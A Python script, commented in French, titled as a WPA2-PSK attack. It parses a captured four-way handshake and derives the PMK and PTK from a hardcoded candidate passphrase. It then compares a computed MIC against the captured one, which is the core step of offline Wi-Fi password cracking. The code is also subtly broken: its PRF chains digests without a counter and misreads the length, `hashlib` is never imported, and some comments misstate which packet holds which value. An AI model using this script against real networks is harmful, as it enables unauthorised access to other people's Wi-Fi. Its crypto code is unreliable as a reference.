from scapy.all import *
from scapy.contrib.wpa_eapol import WPA_key
from hashlib import pbkdf2_hmac
from passlib.utils import pbkdf2
import hmac


class Wpa2PskAttack:
    def main(self, passphrase):
        # Lecture du fichier pcap contenant le handshake
        packets = rdpcap('C:\\Users\\...\\Downloads\\wayhandshake.pcap')
        
        # Récupération du SSID de l'AP dans le premier paquet
        ssid = packets[0][Dot11].info.decode()
        print("=========================")
        print(f"SSID: {ssid}")
        
        # Récupération de l'adresse MAC du client et de l'AP dans le deuxième paquet
        client = bytes.fromhex(packets[1][Dot11].addr1.replace(":",""))
        ap = bytes.fromhex(packets[1][Dot11].addr2.replace(":",""))
        
        # Récupération des nonces aNonce et sNonce dans le troisième paquet
        anonce = packets[1][WPA_key].nonce
        snonce = packets[2][WPA_key].nonce
        
        # Affichage des nonces pour vérification*
        print("=========================")
        print(f"aNonce: {anonce.hex()}")
        print(f"sNonce: {snonce.hex()}")
        
        # Récupération du MIC dans le troisième paquet
        MIC = packets[2][WPA_key].wpa_key_mic.hex()
        print("=========================")
        print(f"MIC: {MIC}")
        
        # Concaténation de plusieurs éléments pour former CONCATENED_NONCE, qui sera utilisé dans le calcul de la PTK
        CONCATENED_NONCE = min(ap, client) + max(ap, client) + min(anonce, snonce) + max(anonce, snonce)
        
        # PAIRWISE_KEY_EXPANSION est une chaîne de caractères constante qui sera utilisée dans le calcul de la PTK
        PAIRWISE_KEY_EXPANSION = b"Pairwise key expansion"
        
        # Génération de PMK et PSK à partir du mot de passe et du SSID
        PMK = pbkdf2.pbkdf2(passphrase.encode(), ssid.encode(), 4096, 32)
        PSK = pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
        
        # Affichage de PMK et PSK pour vérification
        print("=========================")
        print(f"PMK: {PMK.hex()}")
        print(f"PSK: {PSK.hex()}")
        print("=========================")
        
        # Récupération du EAPOL frame dans le troisième paquet et suppression de la valeur de MIC
        eapol_frame = bytes(packets[2][EAPOL]).hex()
        eapol_frame = eapol_frame[:162]+(32*"0")+eapol_frame[194:]
        print(f"EAPOL_M2: {eapol_frame}")
        print("=========================")
        
        # Calcul de la PTK à partir de PMK, PAIRWISE_KEY_EXPANSION et CONCATENED_NONCE
        PTK = self.PRF(PMK,PAIRWISE_KEY_EXPANSION, CONCATENED_NONCE, 384)
        print(f"PTK: {PTK.hex()}")
        
        # KCK est le premier bloc de 16 octets de PTK, il sera utilisé pour calculer CMIC
        KCK = PTK[0:16]
        print("=========================")
        print(f"KCK: {KCK.hex()}")

        # Calcul de la valeur de MIC utilisant KCK et les données extraites des paquets
        CALCULATED_MIC = hmac.new(KCK, bytes.fromhex(eapol_frame), hashlib.sha1).hexdigest()[:32]
        print("=========================")
        print(f"CALCULATED_MIC: {CALCULATED_MIC}")
        print("=========================")
        
        # Vérification si la valeur de MIC calculée correspond à celle extraite du paquet
        if CALCULATED_MIC == MIC:
            print("Le handshake a été capturé avec succès et la valeur de MIC est valide.")
        else:
            print("La valeur de MIC extraite du paquet ne correspond pas à celle calculée.")
    
    def PRF(self, pmk, text,key_data, length):
        """
        Cette fonction implémente l'algorithme Pseudo-Random Function (PRF) utilisé pour générer la clé PTK
        """
        # Calcul du hachage HMAC-SHA1 de cette chaîne de caractères avec pmk comme clé
        hmacsha1 = hmac.new(pmk, text + b'\x00' + key_data + b'\x00', hashlib.sha1)
        # Concaténation des octets de hachage pour former le résultat
        result = hmacsha1.digest()
        while len(result) < length:
            hmacsha1 = hmac.new(pmk, hmacsha1.digest(), hashlib.sha1)
            result += hmacsha1.digest()
        return result[:length]


# Création d'une instance de la classe Wpa2PskAttack et exécution de la fonction main()
attack = Wpa2PskAttack()
attack.main(passphrase="submarine")
